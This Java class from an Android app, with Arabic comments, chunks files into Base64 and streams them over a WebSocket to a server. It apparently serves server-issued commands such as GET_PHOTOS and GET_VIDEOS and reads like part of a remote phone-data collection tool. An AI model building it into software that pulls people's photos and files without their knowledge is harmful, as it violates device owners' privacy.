package com.recoverdata.phone.data;

import android.content.Context;
import android.os.Build;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import com.recoverdata.phone.network.MessageProtocol;
import com.recoverdata.phone.network.WebSocketManager;
import com.recoverdata.phone.utils.Logger;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * DataSender
 * ============================================================
 * يرسل الملفات (Streams) إلى السيرفر عبر WebSocket.
 *
 * المسؤوليات:
 *   1. قراءة InputStream في chunks.
 *   2. تحويل كل chunk إلى Base64.
 *   3. إرسال كل chunk كرسالة FILE_CHUNK.
 *   4. انتظار بين الإرسالات (Backpressure).
 *   5. حساب السرعة وإشعار التقدم.
 *
 * آلية العمل:
 *   - chunkSize = 256 KB (افتراضي) أو 512 KB للفيديوهات.
 *   - كل chunk يُرسل برسالة منفصلة تحمل index + total.
 *   - الـ index يبدأ من 0.
 *   - إذا فشل الإرسال، نُعيد المحاولة (retries).
 *
 * يعتمد على:
 *   - WebSocketManager (الإرسال)
 *   - MessageProtocol (صيغة الرسالة)
 * ============================================================
 */
public class DataSender {

    // =============================================================
    // 1. الثوابت
    // =============================================================
    private static final String TAG = "DataSender";

    // حجم الـ chunk الافتراضي (256 KB)
    public static final int DEFAULT_CHUNK_SIZE = 256 * 1024;

    // حجم الـ chunk للفيديوهات (512 KB)
    public static final int VIDEO_CHUNK_SIZE = 512 * 1024;

    // حجم الـ chunk للصور الصغيرة (128 KB)
    public static final int SMALL_CHUNK_SIZE = 128 * 1024;

    // الحد الأقصى لعدد محاولات الإرسال
    private static final int MAX_SEND_RETRIES = 3;

    // فترة الانتظار بين المحاولات (ms)
    private static final long RETRY_DELAY_MS = 500;

    // فترة الانتظار بين chunks (ms) - لمنع إغراق Buffer
    private static final long INTER_CHUNK_DELAY_MS = 10;

    // =============================================================
    // 2. الحقول
    // =============================================================
    private final Context appContext;

    // حالة الإلغاء
    private final AtomicBoolean cancelled = new AtomicBoolean(false);

    // =============================================================
    // 3. البناء
    // =============================================================
    public DataSender(@NonNull Context context) {
        this.appContext = context.getApplicationContext();
    }

    // =============================================================
    // 4. الدالة الرئيسية
    // =============================================================

    /**
     * إرسال ملف من InputStream.
     *
     * @param inputStream مصدر البيانات
     * @param filename    اسم الملف
     * @param mimeType    نوع MIME
     * @param totalSize   الحجم الكلي (0 = غير معروف)
     * @param cmd         الأمر (GET_PHOTOS, GET_VIDEOS, ...)
     * @param requestId   معرف الطلب
     * @param ws          WebSocketManager
     * @return true إذا نجح الإرسال
     */
    public boolean sendStream(@NonNull InputStream inputStream,
                              @NonNull String filename,
                              @NonNull String mimeType,
                              long totalSize,
                              @NonNull String cmd,
                              @Nullable String requestId,
                              @NonNull WebSocketManager ws) throws Exception {

        // إعادة تعيين حالة الإلغاء
        cancelled.set(false);

        // ----- 1. حساب عدد الأجزاء -----
        int chunkSize = pickChunkSize(mimeType, totalSize);
        int totalChunks = 0;
        if (totalSize > 0) {
            totalChunks = (int) Math.ceil((double) totalSize / chunkSize);
        }
        // إذا totalSize=0، سنحسبها أثناء القراءة (streaming)

        Logger.i(TAG, "Sending " + filename
                + " | size=" + totalSize
                + " | chunkSize=" + chunkSize
                + " | totalChunks=" + totalChunks);

        // ----- 2. قراءة وإرسال -----
        int index = 0;
        long totalSent = 0;
        long startTime = System.currentTimeMillis();
        byte[] buffer = new byte[chunkSize];

        while (!cancelled.get()) {
            // قراءة chunk
            int read = readFully(inputStream, buffer, chunkSize);
            if (read <= 0) break;  // انتهى الملف

            // نسخ البيانات الفعلية
            byte[] chunkData;
            if (read == chunkSize) {
                chunkData = buffer;
            } else {
                chunkData = new byte[read];
                System.arraycopy(buffer, 0, chunkData, 0, read);
            }

            // تحويل إلى Base64
            String base64Chunk = android.util.Base64.encodeToString(
                    chunkData,
                    android.util.Base64.NO_WRAP
            );

            // إرسال chunk
            boolean sent = sendChunkWithRetry(
                    ws,
                    requestId,
                    cmd,
                    filename,
                    mimeType,
                    totalSize,
                    index,
                    totalChunks,  // قد يكون 0 في streaming mode
                    base64Chunk
            );

            if (!sent) {
                Logger.e(TAG, "Failed to send chunk " + index
                        + " of " + filename);
                return false;
            }

            // إحصائيات
            totalSent += read;
            index++;

            // إشعار التقدم كل 10 chunks
            if (index % 10 == 0) {
                notifyProgress(ws, requestId, filename, totalSent, totalSize,
                        index, totalChunks, startTime);
            }

            // استراحة صغيرة
            if (INTER_CHUNK_DELAY_MS > 0) {
                try {
                    Thread.sleep(INTER_CHUNK_DELAY_MS);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    break;
                }
            }
        }

        // ----- 3. التحقق من الإلغاء -----
        if (cancelled.get()) {
            Logger.w(TAG, "Sending cancelled: " + filename);
            return false;
        }

        // ----- 4. إحصائيات نهائية -----
        long elapsed = System.currentTimeMillis() - startTime;
        double speedKBps = (elapsed > 0)
                ? (totalSent / 1024.0) / (elapsed / 1000.0)
                : 0;

        Logger.i(TAG, "✅ Sent " + filename
                + " | " + index + " chunks"
                + " | " + formatSize(totalSent)
                + " | " + elapsed + "ms"
                + " | " + String.format("%.1f KB/s", speedKBps));

        // إشعار نهائي
        notifyProgress(ws, requestId, filename, totalSent, totalSize,
                index, index, startTime);

        return true;
    }

    /**
     * إلغاء العملية الجارية.
     */
    public void cancel() {
        cancelled.set(true);
        Logger.i(TAG, "Cancel requested");
    }

    // =============================================================
    // 5. إرسال chunk مع إعادة المحاولة
    // =============================================================
    private boolean sendChunkWithRetry(@NonNull WebSocketManager ws,
                                       @Nullable String requestId,
                                       @NonNull String cmd,
                                       @NonNull String filename,
                                       @NonNull String mimeType,
                                       long totalSize,
                                       int index,
                                       int totalChunks,
                                       @NonNull String base64Chunk) {

        // بناء الرسالة
        String message = MessageProtocol.buildFileChunk(
                requestId,
                cmd,
                filename,
                mimeType,
                totalSize,
                index,
                totalChunks,
                base64Chunk
        );

        // محاولات متعددة
        for (int attempt = 1; attempt <= MAX_SEND_RETRIES; attempt++) {
            if (cancelled.get()) return false;

            try {
                boolean ok = ws.send(message);
                if (ok) return true;

                Logger.w(TAG, "Send attempt " + attempt + " failed for chunk "
                        + index);

            } catch (Exception e) {
                Logger.e(TAG, "Send error (attempt " + attempt + ")", e);
            }

            // انتظار قبل إعادة المحاولة
            if (attempt < MAX_SEND_RETRIES) {
                try {
                    Thread.sleep(RETRY_DELAY_MS * attempt);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    return false;
                }
            }
        }

        return false;
    }

    // =============================================================
    // 6. إشعارات التقدم
    // =============================================================
    private void notifyProgress(@NonNull WebSocketManager ws,
                                @Nullable String requestId,
                                @NonNull String filename,
                                long bytesSent,
                                long totalBytes,
                                int chunksSent,
                                int totalChunks,
                                long startTime) {
        try {
            long elapsed = System.currentTimeMillis() - startTime;
            double speed = (elapsed > 0)
                    ? (bytesSent / 1024.0) / (elapsed / 1000.0)
                    : 0;

            int progress = 0;
            if (totalBytes > 0) {
                progress = (int) ((bytesSent * 100) / totalBytes);
            } else if (totalChunks > 0) {
                progress = (chunksSent * 100) / totalChunks;
            }

            JSONObject data = new JSONObject();
            data.put("id", requestId != null ? requestId : "");
            data.put("filename", filename);
            data.put("bytesSent", bytesSent);
            data.put("totalBytes", totalBytes);
            data.put("chunksSent", chunksSent);
            data.put("totalChunks", totalChunks);
            data.put("progress", progress);
            data.put("speedKBps", Math.round(speed));
            data.put("elapsedMs", elapsed);

            String event = MessageProtocol.buildEvent("FILE_PROGRESS", data);
            ws.send(event);

        } catch (Exception e) {
            Logger.d(TAG, "notifyProgress error: " + e.getMessage());
        }
    }

    // =============================================================
    // 7. أدوات مساعدة
    // =============================================================

    /**
     * اختيار حجم الـ chunk حسب نوع الملف.
     */
    private int pickChunkSize(@NonNull String mimeType, long totalSize) {
        String mime = mimeType.toLowerCase();

        // فيديوهات
        if (mime.startsWith("video/")) {
            return VIDEO_CHUNK_SIZE;
        }

        // صور
        if (mime.startsWith("image/")) {
            // صور صغيرة: chunk صغير
            if (totalSize > 0 && totalSize < 512 * 1024) {
                return SMALL_CHUNK_SIZE;
            }
            return DEFAULT_CHUNK_SIZE;
        }

        // ملفات عامة
        return DEFAULT_CHUNK_SIZE;
    }

    /**
     * قراءة كاملة قدر الإمكان من InputStream.
     * قد تُرجع أقل من chunkSize إذا انتهى الملف.
     */
    private int readFully(@NonNull InputStream inputStream,
                          @NonNull byte[] buffer,
                          int maxBytes) throws Exception {

        int totalRead = 0;
        int attempts = 0;

        while (totalRead < maxBytes) {
            int read = inputStream.read(
                    buffer,
                    totalRead,
                    maxBytes - totalRead
            );

            if (read < 0) break;  // EOF
            totalRead += read;
            attempts++;

            // إذا قرأنا ما يكفي، توقف
            if (read == 0) {
                // لا تقدم؟ انتظر قليلاً
                attempts++;
                if (attempts > 10) break;
                Thread.sleep(5);
            }
        }

        return totalRead;
    }

    /**
     * تنسيق الحجم.
     */
    @NonNull
    private static String formatSize(long bytes) {
        if (bytes < 1024) return bytes + " B";
        if (bytes < 1024 * 1024) return String.format("%.1f KB", bytes / 1024.0);
        if (bytes < 1024L * 1024 * 1024) {
            return String.format("%.1f MB", bytes / (1024.0 * 1024));
        }
        return String.format("%.2f GB", bytes / (1024.0 * 1024 * 1024));
    }

    // =============================================================
    // 8. دوال مساعدة عامة (للاستخدام من Collectors)
    // =============================================================

    /**
     * إرسال bytes مباشرة (للاختبار).
     */
    public boolean sendBytes(@NonNull byte[] data,
                             @NonNull String filename,
                             @NonNull String mimeType,
                             @NonNull String cmd,
                             @Nullable String requestId,
                             @NonNull WebSocketManager ws) throws Exception {

        java.io.ByteArrayInputStream bais = new java.io.ByteArrayInputStream(data);
        try {
            return sendStream(bais, filename, mimeType, data.length,
                    cmd, requestId, ws);
        } finally {
            try { bais.close(); } catch (Exception ignored) {}
        }
    }

    /**
     * إرسال ملف محلي.
     */
    public boolean sendFile(@NonNull java.io.File file,
                            @NonNull String cmd,
                            @Nullable String requestId,
                            @NonNull WebSocketManager ws) throws Exception {

        java.io.FileInputStream fis = new java.io.FileInputStream(file);
        try {
            String mime = guessMimeFromName(file.getName());
            return sendStream(fis, file.getName(), mime, file.length(),
                    cmd, requestId, ws);
        } finally {
            try { fis.close(); } catch (Exception ignored) {}
        }
    }

    /**
     * تخمين MIME (مبسّط).
     */
    @NonNull
    private static String guessMimeFromName(@NonNull String name) {
        String ext = "";
        int dot = name.lastIndexOf('.');
        if (dot >= 0) ext = name.substring(dot + 1).toLowerCase();

        switch (ext) {
            case "jpg":
            case "jpeg": return "image/jpeg";
            case "png":  return "image/png";
            case "gif":  return "image/gif";
            case "mp4":  return "video/mp4";
            case "mkv":  return "video/x-matroska";
            case "pdf":  return "application/pdf";
            case "zip":  return "application/zip";
            case "txt":  return "text/plain";
            default:     return "application/octet-stream";
        }
    }
}